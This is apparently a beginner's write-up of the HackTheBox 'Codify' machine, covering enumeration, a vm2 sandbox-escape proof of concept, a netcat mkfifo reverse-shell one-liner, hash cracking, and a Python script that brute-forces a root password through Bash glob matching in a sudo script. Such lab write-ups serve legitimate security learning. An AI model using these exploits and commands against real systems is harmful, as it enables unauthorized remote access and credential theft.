**Easy box by HTB - Codify💻**

As a quick preview, this box was one of the first boxes I've ever done and documented. Apologies if some of the walkthrough is unclear or not fully fleshed out. Improving clarity will be a goal for me going forward. Anyways, hope you enjoy Codify!


## Enumeration

  As always, it’s good to start with an nmap scan. I do two, one that displays super simple information, and one that gives me more detail.

**Simple**


![simple nmap](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/3684072f-95a1-4080-95ea-00944a066ae3)


**Detailed**


![detail nmap](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/f7bd964e-ffe2-4384-9ca8-ac72241c1988)

The big thing that I gathered from the scan is the open port on 3000, which uses Node.js. This is probably going to end up being our exploitation avenue


## Info Gathering

Since there is an open http server, lets visit it!
![site down](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/7f3e1819-5beb-4aaa-9684-6ee04a3c023d)


We get redirected to codify.htb —> If this happens and it doesn’t let you visit the site, try adding the IP address of the box to your /etc hosts file like so:

Press CTRL + S to save and CTRL + X to exit.
![hosts](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/c8bd7101-ba22-434a-ba3f-ba1231d29d2f)


Here is our website!

![website](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/e7ad686b-47c8-454f-85b4-5cda38f2be1a)








## Website Enumeration (using gobuster)

The first thing I like to do with a website is to look for directories using gobuster.

![gobuster](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/4750c956-a9d8-4e3c-9cc3-976183bc8783)

Nothing particularly interesting… lets continue searching on the website itself.


In the about page, we see that they use the vm2 library. We could potentially use this, but lets keep exploring.

![vm2](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/19255a93-8856-49cc-9e3f-2bfefa6a08e4)










## Exploitation

After some further searching, I went back to the vm2 library and found a [CVE](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) that is perfect for us!

By using this code and changing some of it out to fit our needs, we can obtain a reverse shell!

```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));

```

In this code we're going to be changing the '.execSync('touch pwned') part into a reverse shell. I strongly suggest reading the CVE as it explains why this works!

To get a reverse shell, I implemented this netcat one liner reverse shell into the snippet of code I mentioned before
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {YOUR IP} {PORT} >/tmp/f
```

After setting up a netcat listener with {nc -lvnp 4444} I ran the code in the editor! Moment of truth! -- We're in!

![rshell](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/0a474a27-286e-459f-859f-dc20010d0129)


To upgrade your shell to become more interactive, you can use this simple python one liner:
```
python3 -c 'import pty;pty.spawn ("/bin/bash")'
```



## Post-Exploitation

After we get an initial foothold on the machine, the first thing I like to do is navigate to the home directory and obtain the user flag. In this case however, we only have low-level permissions. So... what now?

This part I got stuck at for a while, but the best thing you can do when completing these CTF challenges is staying persistent! After navigating to  /var/www/contact and stumbled across a file called tickets.db

using ‘strings tickets.db’ I was able to find user joshua’s hash!
![hash](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/7f5fa672-e1e8-4cc6-b3c1-3346469568a5)

**Lets crack this hash with John!**
![john](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/c1c40dc1-eb4b-42bb-a846-a33e39510e72)

We have our password! Let’s ssh into the codify server with joshua’s credentials.
![ssh](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/a168df9c-b068-4a49-9f0e-afc90fe31a8e)

We're in! What next?


## Lateral Movement & PrivEsc
The last part of any CTF is privilege escelation, which can sometimes be the most difficult part of the challenge. This was one of those times. I had to refer to a seperate walkthrough to help me through this one. Alas, let us continue our journey!

After obtaining our user flag, I ran a quick ‘sudo -l’ to see what privileges joshua has.
![sudo -l](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/28cbc4b7-37ed-4956-90f4-2ec29aeed356)

Navigating to this file and opening it with nano, this is what we see:

![nano](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/e1623fd5-2bcd-4781-9334-585d6b4e1532)

Interesting, maybe we can edit this file to give us root access to the database?

Unfortunately, my first attempt at PrivEsc got absolutely stomped on, as Joshua doesn’t have the nano permissions. 

![nonano](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/a46925bb-b07b-450c-8647-a2bc07076b75)


After looking at the code again, I realized that there is a vulnerablilty with how password handling is happening.
```
if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi
```

According to a walkthrough I was following (I knew there was going to be an exploit like this, I just didn’t know exactly why)

“This section of the script compares the user-provided password (USER_PASS) with the actual database password (DB_PASS). The vulnerability here is due to the use of == inside [[ ]] in Bash, which performs pattern matching rather than a direct string comparison. This means that the user input (USER_PASS) is treated as a pattern, and if it includes glob characters like * or ?, it can potentially match unintended strings.

For example, if the actual password (DB_PASS) is password123 and the user enters * as their password (USER_PASS), the pattern match will succeed because * matches any string, resulting in unauthorized access.

This means we can bruteforce every char in the DB_PASS.“

The walkthrough I was following created a custom python script, which did exactly that - bruteforcing every character in the database.

```
import string
import subprocess

def check_password(p):
	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
	result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
	return "Password confirmed!" in result.stdout

charset = string.ascii_letters + string.digits
password = ""
is_password_found = False

while not is_password_found:
	for char in charset:
		if check_password(password + char):
			password += char
			print(password)
			break
	else:
		is_password_found = True
```

If you don't understand this python script fully, THAT IS OK! At first I didn't really understand it either. The best thing you can do is dive deeper and understand it bit by bit. Which I am about to explain here:


Lets break this script down:

1. **Importing Libraries:**
```
pythonCopy code
import string
import subprocess
```
- **`string`** module provides a collection of string constants, like **`ascii_letters`** (concatenation of lowercase and uppercase letters) and **`digits`** (string of digits '0' to '9').
- **`subprocess`** module allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.

2. **Defining a Function:**
```
pythonCopy code
def check_password(p):
    command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return "Password confirmed!" in result.stdout
```
- This function, **`check_password`**, takes a password (**`p`**) as input and runs a shell command using **`subprocess.run`**.
- The command is constructed by echoing the provided password followed by an asterisk (**``**) and then passing it to a script (**`mysql-backup.sh`**) using **`sudo`**.
- The output and errors of the subprocess are captured in the **`result`** variable.
- The function returns **`True`** if the string "Password confirmed!" is found in the standard output (**`result.stdout`**), indicating a successful password attempt.

3. **Brute Force Loop:**
```
charset = string.ascii_letters + string.digits
password = ""
is_password_found = False

while not is_password_found:
    for char in charset:
        if check_password(password + char):
            password += char
            print(password)
            break
    else:
        is_password_found = True
```
- The script defines a character set (**`charset`**) consisting of letters (both lowercase and uppercase) and digits.
- It initializes an empty **`password`** and a flag **`is_password_found`**.
- The code uses a **`while`** loop that continues until the correct password is found.
- Inside the loop, there is a **`for`** loop that iterates over each character in the character set.
- It calls the **`check_password`** function with the current password attempt (**`password + char`**).
- If the password attempt is successful, the character is appended to the password, and the loop continues with the next character.
- If none of the characters are successful, the **`else`** block of the **`for`** loop is executed, setting **`is_password_found`** to **`True`** and ending the outer **`while`** loop.


That was a lot of information! Before we continue, feel free to reread some of the notes again if any of it was unclear. Remember, CTFs are all about learning, so try not to breeze by the learning part!

Moving on! I created a file with the scrip inside and ran it! here is the output:
![script](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/e313854b-e0d6-47d9-b5f5-7cf1054bb31d)

We have our root password!

Lets use the ‘su’ command (switch user) to switch to root and get our flag!
![flag](https://github.com/NoahHeroldt/CTF-Writeups/assets/150489159/be610c72-745e-4074-9490-af8adf0e3201)


Overall, I thought this box was great. I had to refer to a walkthrough for about 10% of the box, especially toward the end part. But I learned a lot, especially about python scripting. 

I hope if you're reading this you learned something too! Have a fantastic day!



